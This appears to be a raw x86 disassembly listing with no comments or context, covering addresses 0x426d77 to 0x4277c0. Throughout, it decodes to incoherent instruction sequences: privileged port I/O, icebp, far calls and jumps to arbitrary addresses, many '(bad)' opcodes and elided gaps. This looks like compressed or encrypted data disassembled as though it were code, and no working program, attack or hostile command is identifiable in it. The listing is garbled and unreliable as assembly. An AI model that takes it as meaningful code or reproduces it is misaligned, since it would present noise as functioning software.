  426d77:	jge    0x426db8
  426d79:	push   edx
  426d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d7b:	test   al,0x59
  426d7d:	add    al,0x31
  426d7f:	mul    BYTE PTR [ebx+ecx*1+0x3]
  426d83:	stc    
  426d84:	xor    dl,bl
  426d86:	ins    DWORD PTR es:[edi],dx
  426d87:	fucomi st,st(7)
  426d89:	mov    DWORD PTR [ebx-0x47fe760d],ebx
  426d8f:	mov    ecx,0x0
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x3f0c:0xc7c2ecf9
  426e01:	outs   dx,BYTE PTR ds:[esi]
  426e02:	lea    ebp,[eax+0x4]
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	clc    
  426e0d:	jle    0x426e4e
  426e0f:	pop    ss
  426e10:	cmp    DWORD PTR [ecx-0x3],edx
  426e13:	dec    esi
  426e14:	sbb    al,0x3a
  426e16:	outs   dx,BYTE PTR ds:[esi]
  426e17:	dec    BYTE PTR [eax+ebx*1+0x107350c7]
  426e1e:	icebp  
  426e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e20:	repz add ch,al
  426e23:	je     0x426e98
  426e25:	push   DWORD PTR [ebp+0x42c57f85]
  426e2b:	adc    BYTE PTR [edi],al
  426e2d:	sbb    ch,ch
  426e2f:	mov    sp,0xa03
  426e33:	push   edi
  426e34:	mov    edi,0x2b240520
  426e39:	retf   0x9cc4
  426e3c:	sbb    ecx,DWORD PTR [edi-0x14c41603]
  426e42:	mov    ebp,0x350acd36
  426e47:	mov    ds:0x3c1feda9,al
  426e4c:	out    0x26,al
  426e4e:	in     eax,dx
  426e4f:	popa   
  426e50:	mov    eax,ds:0xb0ff1eff
  426e55:	or     edx,DWORD PTR [esi-0x7c6a0fa8]
  426e5b:	jl     0x426ea4
  426e5d:	jns    0x426e28
  426e5f:	mov    BYTE PTR [esi-0xc34b833],dl
  426e65:	pusha  
  426e66:	pop    DWORD PTR [edi-0x42]
  426e69:	(bad)  
  426e6b:	jo     0x426e30
  426e6d:	push   ds
  426e6e:	jnp    0x426e71
  426e70:	sbb    bh,dl
  426e72:	sub    dh,dl
  426e74:	fwait
  426e75:	(bad)  
  426e76:	je     0x426e30
  426e78:	nop
  426e79:	or     eax,0x6d934253
  426e7e:	mov    al,dl
  426e80:	arpl   WORD PTR [edx],bx
  426e82:	lahf   
  426e83:	sub    al,0xda
  426e85:	ins    BYTE PTR es:[edi],dx
  426e86:	scas   eax,DWORD PTR es:[edi]
  426e87:	inc    ecx
  426e88:	mov    eax,ds:0x796d118d
  426e8d:	icebp  
  426e8e:	fwait
  426e8f:	xchg   ebx,eax
  426e90:	dec    BYTE PTR cs:[ecx-0x4d]
  426e94:	xchg   ebp,eax
  426e95:	mov    esp,0xfcc58d08
  426e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e9b:	int3   
  426e9c:	daa    
  426e9d:	sbb    esp,esp
  426e9f:	(bad)  
  426ea0:	mov    edx,DWORD PTR [edi]
  426ea2:	es in  al,dx
  426ea4:	fwait
  426ea5:	ja     0x426e55
  426ea7:	jns    0x426f07
  426ea9:	or     BYTE PTR [edx+ebx*2+0x4e0240a4],0xcc
  426eb1:	imul   esp,DWORD PTR ds:0x2b4eb08d,0xffffffc2
  426eb8:	add    eax,0xf2cbe30
  426ebd:	mov    ecx,0xb5fc58f
  426ec2:	dec    esi
  426ec3:	push   ebx
  426ec4:	xlat   BYTE PTR ds:[ebx]
  426ec5:	sbb    BYTE PTR [ecx+ebp*2-0x433448dc],bh
  426ecc:	cmp    eax,0x10613e4c
  426ed1:	popf   
  426ed2:	daa    
  426ed3:	shr    DWORD PTR [edx-0x36],0x2a
  426ed7:	cmp    DWORD PTR [edi+0x1f],ebx
  426eda:	jmp    0x426f08
  426edc:	jae    0x426eb5
  426ede:	int    0xec
  426ee0:	popa   
  426ee1:	jmp    0xd212d2b1
  426ee6:	jnp    0x426edf
  426ee8:	mov    ds:0xcd43f664,al
  426eed:	and    al,0x30
  426eef:	inc    esi
  426ef0:	jp     0x426ec7
  426ef2:	mov    al,0xfd
  426ef4:	pusha  
  426ef5:	lea    ebx,[ecx+0x3f803100]
  426efb:	dec    ebx
  426efc:	cmp    al,0x1f
  426efe:	popa   
  426eff:	enter  0x82d0,0xca
  426f03:	bound  edx,QWORD PTR [esi-0x61]
  426f06:	sbb    al,0x11
  426f08:	lea    ebx,[ebp+0x5e87a2e0]
  426f0e:	adc    eax,0xb8
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esp+ebx*8+0x82f7774],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	or     al,0x6
  426f8e:	test   eax,0x2269c41a
  426f93:	push   ebx
  426f94:	sub    al,0x1b
  426f96:	dec    ebx
  426f97:	push   edx
  426f98:	jg     0x426fdb
  426f9a:	xchg   ecx,eax
  426f9b:	mov    al,0x59
  426f9d:	ds shl ebp,1
  426fa0:	stos   BYTE PTR es:[edi],al
  426fa1:	pop    esp
  426fa2:	xchg   BYTE PTR [ebp+ebx*1+0x44],ah
  426fa6:	(bad)  
  426fa7:	out    0xb9,al
  426fa9:	retf   0xcf9a
  426fac:	mov    dl,0xc8
  426fae:	xchg   ebx,eax
  426faf:	lods   eax,DWORD PTR ds:[esi]
  426fb0:	lock gs inc ebp
  426fb3:	int3   
  426fb4:	adc    esi,DWORD PTR [eax+0x54]
  426fb7:	stos   BYTE PTR es:[edi],al
  426fb8:	or     ebp,ebx
  426fba:	mov    cl,0x1d
  426fbc:	out    dx,al
  426fbd:	adc    edi,DWORD PTR [ecx]
  426fbf:	mov    bh,0xe8
  426fc1:	fstp   DWORD PTR [edi+0x9]
  426fc4:	or     esp,edi
  426fc6:	mov    BYTE PTR [ebp+0x52],dl
  426fc9:	xchg   esi,eax
  426fca:	int3   
  426fcb:	add    edi,DWORD PTR [ebx-0x1d]
  426fce:	cwde   
  426fcf:	push   esi
  426fd0:	lds    ecx,FWORD PTR [edi+ecx*8+0x30bcb111]
  426fd7:	fbstp  TBYTE PTR [ebx+0x79]
  426fda:	dec    eax
  426fdb:	mov    cl,0x78
  426fdd:	imul   esp,DWORD PTR [ebx],0x39
  426fe0:	pop    edi
  426fe1:	nop
  426fe2:	mov    eax,0xc80f144
  426fe7:	fcmovnu st,st(0)
  426fe9:	inc    ebx
  426fea:	test   al,0xc
  426fec:	xchg   DWORD PTR [ecx],ebp
  426fee:	or     BYTE PTR [edx],dh
  426ff0:	push   0xe6802be7
  426ff5:	sub    BYTE PTR [edx],dh
  426ff7:	inc    esp
  426ff8:	dec    eax
  426ff9:	mov    edx,edx
  426ffb:	pop    esi
  426ffc:	popa   
  426ffd:	fsubr  st,st(1)
  426fff:	xor    eax,0x1cfee3a8
  427004:	stos   DWORD PTR es:[edi],eax
  427005:	jnp    0x427010
  427007:	mov    DWORD PTR [ebp+0x64c75b8f],esp
  42700d:	sbb    al,0x15
  42700f:	call   0xc970:0x8a6281f6
  427016:	lods   al,BYTE PTR ds:[esi]
  427017:	jmp    0x417456cb
  42701c:	icebp  
  42701d:	xor    cl,BYTE PTR [esi+0x4eaab2cf]
  427023:	inc    ebx
  427024:	jp     0x427092
  427026:	jbe    0x426fb6
  427028:	xchg   esp,eax
  427029:	dec    BYTE PTR [ebx+0x3f57c3e4]
  42702f:	or     al,0x88
  427031:	xor    eax,0xc182cde1
  427036:	pop    edx
  427037:	std    
  427038:	mov    al,ds:0x19dc9979
  42703d:	add    al,0x5d
  42703f:	leave  
  427040:	mov    eax,0x94bba6c
  427045:	into   
  427046:	jnp    0x427005
  427048:	dec    ebp
  427049:	aad    0xed
  42704b:	dec    esi
  42704c:	jne    0x42706f
  42704e:	push   ebx
  42704f:	shr    DWORD PTR [esi-0x74],cl
  427052:	sbb    ah,ah
  427054:	int    0xb5
  427056:	sub    BYTE PTR [ebx-0x2a],al
  427059:	rcl    DWORD PTR [esp+eax*8+0x6c],cl
  42705d:	sar    BYTE PTR [esi-0xc5b567a],1
  427063:	icebp  
  427064:	sub    edi,DWORD PTR [eax-0x6e]
  427067:	inc    edx
  427068:	pop    esi
  427069:	mov    DWORD PTR [eax+eiz*2],ebp
  42706c:	jbe    0x427064
  42706e:	and    BYTE PTR [esp+edi*8-0x43dfe137],0xab
  427076:	(bad)  
  427077:	sahf   
  427078:	outs   dx,BYTE PTR ds:[esi]
  427079:	push   ds
  42707a:	pusha  
  42707b:	(bad)  
  42707c:	in     al,0xdd
  42707e:	mov    ecx,DWORD PTR [edi+0x4f]
  427081:	loopne 0x4270de
  427083:	mov    al,ds:0x7f976bea
  427088:	jmp    0x427109
  42708a:	sti    
  42708b:	and    al,0xa0
  42708d:	mul    DWORD PTR [edx]
  42708f:	sldt   WORD PTR [eax]
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x13569d96
  427102:	dec    esi
  427103:	cmp    eax,0x1a10c
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	or     DWORD PTR [ebp-0x52],ebx
  42710f:	stc    
  427110:	aaa    
  427111:	pop    ebx
  427112:	sub    DWORD PTR [eax-0x4ca2384],edx
  427118:	int    0x24
  42711a:	in     al,dx
  42711b:	sbb    cl,dh
  42711d:	ror    WORD PTR ds:[ecx],cl
  427121:	cld    
  427122:	lods   eax,DWORD PTR ds:[esi]
  427123:	inc    esp
  427124:	jmp    0x386a1fa8
  427129:	out    0x2b,eax
  42712b:	ins    BYTE PTR es:[edi],dx
  42712c:	xor    edi,DWORD PTR [ebx+edx*4]
  42712f:	dec    eax
  427130:	jle    0x4270b4
  427132:	enter  0x6c44,0x87
  427136:	lea    esp,[edi-0x1b]
  427139:	ss out dx,al
  42713b:	pop    ebx
  42713c:	mov    edi,0xf8e5916
  427141:	cmp    DWORD PTR [edx],edi
  427143:	sahf   
  427144:	and    al,0x93
  427146:	jnp    0x4271b5
  427148:	clc    
  427149:	sbb    al,0x96
  42714b:	fwait
  42714c:	xchg   esi,eax
  42714d:	mov    ebx,0x315ba820
  427152:	addr16 pop esp
  427154:	ja     0x4271a9
  427156:	rol    BYTE PTR [edx],0x60
  427159:	mov    dh,0xe3
  42715b:	sub    cl,al
  42715d:	push   edi
  42715e:	inc    ebp
  42715f:	inc    ebx
  427160:	dec    ecx
  427161:	leave  
  427162:	ins    BYTE PTR es:[edi],dx
  427163:	xor    eax,DWORD PTR ds:0x45cc463
  427169:	gs jl  0x4271d0
  42716c:	imul   DWORD PTR ds:0x5b75fcfc
  427172:	xlat   BYTE PTR ds:[ebx]
  427173:	test   eax,0x1aa29ce4
  427178:	imul   ecx,DWORD PTR [esi],0x253c9e3d
  42717e:	mov    edx,0x7ba516a6
  427183:	mov    esi,0x19cf487f
  427188:	rcr    ebx,0x7a
  42718b:	sbb    eax,0x3147de32
  427190:	dec    ebx
  427191:	repnz out 0x70,eax
  427194:	dec    edi
  427195:	lock dec ebx
  427197:	lock jmp 0x4271f5
  42719a:	out    dx,eax
  42719b:	mov    es,WORD PTR [esi]
  42719d:	pusha  
  42719e:	jb     0x427154
  4271a0:	lods   eax,DWORD PTR ds:[esi]
  4271a1:	fadd   QWORD PTR [edx+eax*2]
  4271a4:	icebp  
  4271a5:	nop
  4271a6:	inc    esi
  4271a7:	ret    0x6c10
  4271aa:	rcl    BYTE PTR [eax+eax*8-0x2957d5d6],0xd
  4271b2:	icebp  
  4271b3:	sub    eax,0x707442b
  4271b8:	jns    0x42716a
  4271ba:	scas   al,BYTE PTR es:[edi]
  4271bb:	gs sub dl,ah
  4271be:	sbb    BYTE PTR [ebx-0xd],dh
  4271c1:	aad    0x7a
  4271c3:	cmp    esp,edi
  4271c5:	sub    edx,DWORD PTR [ecx]
  4271c7:	(bad)  
  4271c8:	fdivr  QWORD PTR [ecx+0x7]
  4271cb:	adc    dl,BYTE PTR [ecx]
  4271cd:	xchg   esp,eax
  4271cf:	mov    gs:0x226a6d84,eax
  4271d5:	jg     0x42716a
  4271d7:	jmp    0xe3f9:0x39dd12c4
  4271de:	jg     0x427182
  4271e0:	xor    al,0xee
  4271e2:	je     0x427167
  4271e4:	add    ah,al
  4271e6:	cmc    
  4271e7:	xchg   edi,eax
  4271e8:	aas    
  4271e9:	pop    ebp
  4271ea:	fmul   DWORD PTR [esi+0x18fd6c7e]
  4271f0:	push   ebp
  4271f1:	cmp    DWORD PTR [ebx-0x5888b62b],ecx
  4271f7:	dec    edx
  4271f9:	retf   
  4271fa:	hlt    
  4271fb:	test   eax,0x4425a0a7
  427200:	xchg   esp,eax
  427201:	not    DWORD PTR [edx+0x33daf40e]
  427207:	int3   
  427208:	or     DWORD PTR [edi-0x41bb79d2],eax
  42720e:	shl    BYTE PTR [ebx],0x0
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xa931214e,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	cmc    
  42728d:	jge    0x42726e
  42728f:	jbe    0x427285
  427291:	xchg   DWORD PTR [edi+0x21abfb70],ecx
  427297:	cmp    ecx,ebp
  427299:	and    al,0x2
  42729b:	(bad)  
  42729c:	out    0x5b,eax
  42729e:	arpl   WORD PTR [ecx-0x34],ax
  4272a1:	fmul   QWORD PTR [esi]
  4272a3:	xchg   esp,eax
  4272a4:	out    0xa3,al
  4272a6:	jno    0x4272f7
  4272a8:	shl    cl,cl
  4272aa:	out    dx,eax
  4272ab:	push   ecx
  4272ac:	push   es
  4272ad:	mov    ds:0xb0f4b2e7,eax
  4272b2:	xchg   esp,eax
  4272b3:	push   ss
  4272b4:	add    eax,0x9b1cd8b2
  4272b9:	mov    ah,0x10
  4272bb:	add    BYTE PTR [esp+eax*4-0x2b],dh
  4272bf:	call   0xddc6299c
  4272c4:	mov    eax,ds:0x88dc19ea
  4272c9:	mov    ah,0xfb
  4272cb:	jo     0x42729f
  4272cd:	dec    ebx
  4272ce:	test   BYTE PTR [esi-0x214817ab],dh
  4272d4:	xchg   BYTE PTR [eax-0x58db8901],dh
  4272da:	dec    edx
  4272db:	sbb    DWORD PTR [edi-0x2],0xffffffb0
  4272df:	cmp    ecx,DWORD PTR [eax-0x28]
  4272e2:	fbstp  TBYTE PTR [eax]
  4272e4:	push   0x2e
  4272e6:	mov    esi,DWORD PTR [eax+edi*2+0x5]
  4272ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272eb:	dec    esi
  4272ec:	pushf  
  4272ed:	loope  0x427359
  4272ef:	cmp    bl,BYTE PTR [ecx+0x49]
  4272f2:	jle    0x4272c3
  4272f4:	jbe    0x42734f
  4272f6:	cmp    BYTE PTR [edi+0x2e],bh
  4272f9:	mov    eax,0x353a2850
  4272fe:	pop    ss
  4272ff:	(bad)  
  427300:	cmp    DWORD PTR [eax-0x71],eax
  427303:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  427305:	ret    
  427306:	pop    ss
  427307:	mov    DWORD PTR [ebx],ebx
  427309:	and    al,0x62
  42730b:	cmp    BYTE PTR [ecx+ebp*4-0xd78d1da],0xda
  427313:	fdivr  DWORD PTR [eax-0x22]
  427316:	xor    edx,DWORD PTR [edx-0x2e]
  427319:	ficom  DWORD PTR [edx]
  42731b:	addr16 loop 0x42732b
  42731e:	push   ss
  42731f:	sbb    BYTE PTR [edi+ecx*8-0x44],dh
  427323:	mov    dh,0x8a
  427325:	popa   
  427326:	cmc    
  427327:	mov    bh,0xf
  427329:	test   cl,ch
  42732b:	js     0x427300
  42732d:	and    ecx,DWORD PTR [eax-0x41]
  427330:	lea    edx,[eax+0x75]
  427333:	rol    edx,1
  427335:	fidiv  DWORD PTR [eax+0x42]
  427338:	icebp  
  427339:	dec    edx
  42733a:	aam    0x85
  42733c:	adc    al,0xcd
  42733e:	jmp    0x427393
  427340:	sbb    eax,0xd1889a86
  427345:	scas   al,BYTE PTR es:[edi]
  427346:	add    eax,0x86ba7cda
  42734b:	inc    esi
  42734c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42734d:	push   ss
  42734e:	push   es
  42734f:	pusha  
  427350:	pop    ss
  427351:	imul   eax,esp,0x8efbb235
  427357:	and    DWORD PTR [edx],edx
  427359:	mov    ebx,0x5f8e1a3c
  42735e:	ja     0x4273bd
  427360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427361:	push   esi
  427362:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  427364:	inc    edi
  427365:	scas   eax,DWORD PTR es:[edi]
  427366:	add    ch,BYTE PTR [ebp+0x5c]
  427369:	stc    
  42736a:	pusha  
  42736b:	retf   
  42736c:	push   0xffffff8e
  42736e:	mov    edi,0xc9c0e305
  427373:	pop    ebx
  427374:	call   0xcfab:0x8dccaa1b
  42737b:	mov    esp,0x7a27b804
  427380:	bnd jne 0x427402
  427383:	adc    edx,DWORD PTR [ecx]
  427385:	mov    bh,0x6f
  427387:	shr    BYTE PTR [ecx+0x2550e10c],1
  42738d:	loope  0x427354
  42738f:	cmp    eax,DWORD PTR [eax]
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    eax,DWORD PTR [edi+edx*1-0x60]
  427403:	dec    esp
  427404:	adc    al,0xa3
  427406:	add    DWORD PTR [eax],eax
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	std    
  42740d:	mov    ah,0x4b
  42740f:	xlat   BYTE PTR ds:[ebx]
  427410:	xchg   ebp,eax
  427411:	int3   
  427412:	sub    BYTE PTR [ebx],cl
  427414:	(bad)  
  427416:	in     eax,dx
  427417:	cwde   
  427418:	loopne 0x427461
  42741a:	out    dx,al
  42741b:	bound  eax,QWORD PTR [ebp-0x77]
  42741e:	retf   0x585b
  427421:	xchg   esp,esp
  427423:	cmp    eax,0x205a6f11
  427428:	sub    ecx,DWORD PTR es:[edi-0x58]
  42742c:	call   0xc8cf820a
  427431:	jbe    0x4273d3
  427433:	mov    cl,0x41
  427435:	ffree  st(0)
  427437:	test   al,0x3b
  427439:	loope  0x427489
  42743b:	rol    ebp,cl
  42743d:	or     edx,DWORD PTR [eax]
  42743f:	dec    eax
  427440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427441:	jmp    0x566413bb
  427446:	shr    al,0x20
  427449:	sub    eax,0x307ff46b
  42744e:	fisubr DWORD PTR [edx-0x6a766daa]
  427454:	mov    bh,0x5b
  427456:	out    0xd,al
  427458:	pop    edx
  427459:	dec    edi
  42745a:	pop    eax
  42745b:	scas   al,BYTE PTR es:[edi]
  42745c:	rcr    DWORD PTR [esi-0x619a1c5c],1
  427462:	popf   
  427463:	aas    
  427464:	rcl    BYTE PTR [eax+0x4a],0xbd
  427468:	or     al,0x21
  42746a:	mov    dl,0xb6
  42746c:	add    dh,BYTE PTR [esi-0x7402b27d]
  427472:	call   FWORD PTR [ebp-0x1d3983f9]
  427478:	mov    dl,BYTE PTR [edx+0x76]
  42747b:	les    eax,FWORD PTR [ebx+ebp*1]
  42747e:	dec    BYTE PTR [edi+0x62db3046]
  427484:	and    ch,BYTE PTR [esi]
  427486:	lods   al,BYTE PTR ds:[esi]
  427487:	xor    ch,0xda
  42748a:	sbb    eax,0x2a599271
  42748f:	icebp  
  427490:	fst    st(4)
  427492:	sbb    eax,DWORD PTR [ebx+0x5e75a7c3]
  427498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427499:	neg    BYTE PTR [esi]
  42749b:	enter  0x2ed4,0xb
  42749f:	iret   
  4274a0:	fist   WORD PTR [edx+0x58]
  4274a3:	loopne 0x427521
  4274a5:	mov    fs,esi
  4274a7:	cwde   
  4274a8:	sub    BYTE PTR [edx+0x6b1c3d68],0x74
  4274af:	mov    eax,0x63f8e4cd
  4274b4:	add    DWORD PTR [edi-0x198843d3],esp
  4274ba:	jl     0x42750e
  4274bc:	jo     0x427497
  4274be:	push   edi
  4274bf:	xchg   esp,eax
  4274c0:	adc    cl,cl
  4274c2:	stos   DWORD PTR es:[edi],eax
  4274c3:	out    0x61,eax
  4274c5:	pop    esp
  4274c6:	(bad)
  4274ca:	and    edi,DWORD PTR [edi+ecx*4-0x59]
  4274ce:	rcr    BYTE PTR [esi+0xfbc5908],1
  4274d4:	imul   ebx,DWORD PTR [eax+esi*2],0x4dc8d798
  4274db:	inc    ecx
  4274dc:	and    ch,BYTE PTR ds:0x27ba48b9
  4274e2:	and    DWORD PTR [ebx-0x386b394e],ecx
  4274e8:	xchg   esi,eax
  4274e9:	mov    dh,cl
  4274eb:	jle    0x4274c1
  4274ed:	sbb    eax,0x12442ea9
  4274f2:	cmp    cl,BYTE PTR [esi+0x26]
  4274f5:	leave  
  4274f6:	leave  
  4274f7:	addr16 enter 0x2b48,0x3
  4274fc:	out    dx,eax
  4274fd:	daa    
  4274fe:	sti    
  4274ff:	push   edi
  427500:	add    bl,BYTE PTR [ebx-0x40]
  427503:	loopne 0x4274e6
  427505:	iret   
  427506:	lock sbb bh,BYTE PTR [ecx-0x1f]
  42750a:	and    DWORD PTR [esi],0xffffffed
  42750d:	pusha  
  42750e:	cs mov edx,0x0
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	int3   
  427581:	(bad)  
  427582:	cmp    eax,0x1a4181d
  427587:	add    BYTE PTR [ecx+eax*1],al
  42758a:	add    BYTE PTR [eax],al
  42758c:	imul   esp,DWORD PTR [esi],0x1b
  42758f:	jl     0x4275a3
  427591:	mov    eax,0x642fdebf
  427596:	out    0xcd,al
  427598:	lea    ecx,[edi+0x53]
  42759b:	push   ecx
  42759c:	sbb    BYTE PTR [esi-0x5a2d200c],0x8c
  4275a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275a4:	rcr    al,0x24
  4275a7:	fmulp  st(0),st
  4275a9:	push   ecx
  4275aa:	push   ss
  4275ab:	mov    dl,0xea
  4275ad:	sbb    dh,ah
  4275af:	jmp    0x6d79a10c
  4275b4:	aaa    
  4275b5:	nop
  4275b6:	(bad)  
  4275b7:	loop   0x427565
  4275b9:	pushf  
  4275ba:	enter  0x9cac,0xf2
  4275be:	jecxz  0x4275f0
  4275c0:	lahf   
  4275c1:	je     0x427618
  4275c3:	xchg   ebx,eax
  4275c4:	xchg   ecx,eax
  4275c5:	cld    
  4275c6:	in     eax,dx
  4275c7:	div    BYTE PTR [ecx+edx*4+0x4b]
  4275cb:	pop    eax
  4275cc:	inc    ebx
  4275cd:	add    al,0x57
  4275cf:	dec    edx
  4275d0:	cmc    
  4275d1:	pop    edx
  4275d2:	pop    es
  4275d3:	pusha  
  4275d4:	ins    DWORD PTR es:[edi],dx
  4275d5:	fcom   DWORD PTR [edx-0x60c176b7]
  4275db:	xchg   ecx,eax
  4275dc:	adc    al,BYTE PTR [edx+0x18548979]
  4275e2:	stos   BYTE PTR es:[edi],al
  4275e3:	cmc    
  4275e4:	mov    esi,0x297957c0
  4275e9:	sbb    al,0x4c
  4275eb:	in     eax,dx
  4275ec:	mov    esi,DWORD PTR [eax+0x64]
  4275ef:	cmp    esp,edi
  4275f1:	inc    edx
  4275f2:	push   es
  4275f3:	xor    edx,DWORD PTR [edi+0x7ab5190e]
  4275f9:	add    al,0x6c
  4275fb:	mov    ds:0xbfc31185,al
  427600:	cmp    eax,0x451a1b7d
  427605:	call   FWORD PTR [esi]
  427607:	jmp    0xc5386bf0
  42760c:	push   es
  42760d:	fs jl  0x427620
  427610:	cmp    al,ah
  427612:	push   ecx
  427613:	cwde   
  427614:	(bad)  
  427615:	fild   QWORD PTR es:[ebx]
  427618:	fwait
  427619:	adc    ebx,DWORD PTR [edx]
  42761b:	popf   
  42761c:	iret   
  42761d:	pushf  
  42761e:	push   eax
  42761f:	(bad)  
  427620:	clc    
  427621:	add    edx,edi
  427623:	dec    edi
  427624:	mov    ds:0x13f4c9ba,al
  427629:	inc    esp
  42762a:	jnp    0x42761e
  42762c:	dec    esp
  42762d:	add    BYTE PTR [ecx],ah
  42762f:	fstp   QWORD PTR [eax-0x38]
  427632:	pop    esi
  427633:	inc    ebp
  427634:	fimul  DWORD PTR [ebp+0x3624040a]
  42763a:	cmp    edi,DWORD PTR [ebx-0x5e]
  42763d:	mov    al,0xb4
  42763f:	mov    dh,0xdd
  427641:	mov    esi,fs
  427643:	add    eax,0xed8ebaf4
  427648:	add    bh,al
  42764a:	scas   al,BYTE PTR es:[edi]
  42764b:	sub    DWORD PTR [ebx-0x6d],ebp
  42764e:	push   ds
  42764f:	sub    eax,0xdda5ef6b
  427654:	push   0x75
  427656:	pop    ebx
  427657:	jmp    0xd375ed29
  42765c:	inc    ebp
  42765d:	pop    ds
  42765e:	jle    0x42765b
  427660:	(bad)  
  427661:	out    dx,al
  427662:	jmp    0x4275f3
  427664:	in     al,dx
  427665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427666:	mov    ch,0xc3
  427668:	mov    dl,0x60
  42766a:	jbe    0x42765e
  42766c:	push   esi
  42766d:	mov    ebp,0x3e3253ed
  427672:	pusha  
  427673:	jg     0x4276ea
  427675:	scas   al,BYTE PTR es:[edi]
  427676:	ror    DWORD PTR [eax+0x27cc86d9],1
  42767c:	int3   
  42767d:	jecxz  0x4276a9
  42767f:	cwde   
  427680:	aaa    
  427681:	(bad)  
  427682:	mov    ch,0x8f
  427684:	cmp    dh,BYTE PTR [edi-0x5b]
  427687:	mov    BYTE PTR [ecx-0x5],ch
  42768a:	mov    ecx,0xcb3ac39e
  42768f:	pop    ss
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fld    DWORD PTR [esi+0x34]
  427702:	aad    0xf8
  427704:	sbb    al,0xa5
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	sahf   
  42770d:	mov    dl,BYTE PTR [eax]
  42770f:	fimul  DWORD PTR [eax+0x367cdde4]
  427715:	pop    ss
  427716:	cmp    DWORD PTR [ecx],0x0
  427719:	or     ebx,DWORD PTR [edx+0x32]
  42771c:	mov    ecx,0x4e406ad9
  427721:	mov    al,0xbb
  427723:	mov    ds:0x2396b9fa,al
  427728:	dec    esi
  427729:	sub    edi,DWORD PTR [ebx]
  42772b:	xor    BYTE PTR ds:0x22973127,ah
  427731:	or     bl,BYTE PTR [esi+edi*4+0x39f5ef7c]
  427738:	cmp    cl,BYTE PTR [ebx-0x1ce9fb14]
  42773e:	inc    ecx
  42773f:	ins    BYTE PTR es:[edi],dx
  427740:	retf   0x6fa1
  427743:	out    dx,al
  427744:	iret   
  427745:	loopne 0x427744
  427747:	stos   DWORD PTR es:[edi],eax
  427748:	inc    ecx
  427749:	ins    BYTE PTR es:[edi],dx
  42774a:	(bad)  
  42774b:	or     BYTE PTR [ebx-0x5317238d],bh
  427751:	icebp  
  427752:	(bad)  
  427754:	repnz xchg ch,bl
  427757:	push   edx
  427758:	outs   dx,DWORD PTR ds:[esi]
  427759:	mov    ecx,0x9334626b
  42775e:	ror    cl,0x9
  427761:	iret   
  427762:	cmp    cl,BYTE PTR [ebx-0x3]
  427765:	xchg   esi,eax
  427766:	push   ds
  427767:	push   0x56
  427769:	mov    DWORD PTR [edx],eax
  42776b:	mov    ch,0x17
  42776d:	cmp    al,0x9c
  42776f:	mov    gs,ecx
  427771:	and    ch,al
  427773:	dec    edi
  427774:	dec    ecx
  427775:	sbb    DWORD PTR [esp+edx*4],ebp
  427778:	sub    eax,0x9a7432b9
  42777d:	pop    DWORD PTR [ecx-0x46]
  427780:	push   edx
  427781:	rcr    DWORD PTR [edi-0x1b],0xd3
  427785:	push   ebp
  427786:	mov    eax,ds:0xf7cd060f
  42778b:	dec    esp
  42778c:	stos   BYTE PTR es:[edi],al
  42778d:	sbb    edx,esi
  42778f:	in     al,dx
  427790:	aas    
  427791:	cmp    ebx,0xb462bb4a
  427797:	sti    
  427798:	ss repz xchg esp,eax
  42779b:	xor    BYTE PTR [esi+0x41],dl
  42779e:	add    DWORD PTR [ecx+ebp*2],esp
  4277a1:	mov    ?,WORD PTR [edi]
  4277a3:	mov    ebx,0xf111bdef
  4277a8:	popa   
  4277a9:	lds    ebx,FWORD PTR [esi]
  4277ab:	ficom  WORD PTR [edx-0x4]
  4277ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277af:	loope  0x427770
  4277b1:	pop    ecx
  4277b2:	mov    cx,0xea35
  4277b6:	xchg   esi,ebp
  4277b8:	es into 
  4277ba:	pop    edi
  4277bb:	mov    esp,0x26fd45eb
  4277c0:	push   ebx
